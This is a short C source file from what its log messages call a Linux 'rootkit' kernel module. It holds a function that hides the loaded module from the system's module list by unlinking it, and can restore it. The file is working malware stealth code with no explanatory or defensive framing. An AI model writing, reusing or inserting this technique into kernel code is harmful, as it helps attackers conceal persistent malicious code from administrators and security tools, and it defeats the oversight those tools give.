#include <linux/module.h>

#include "lkm.h"

short lkm_hidden = 0;
struct list_head* prev_module;

void toggle_lkm_visibility(void)
{
  if (!lkm_hidden) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    printk(KERN_DEBUG "rootkit: LKM hidden\n");
  } else {
    list_add(&THIS_MODULE->list, prev_module);
    printk(KERN_DEBUG "rootkit: LKM unhidden\n");
  }

  lkm_hidden = !lkm_hidden;
}
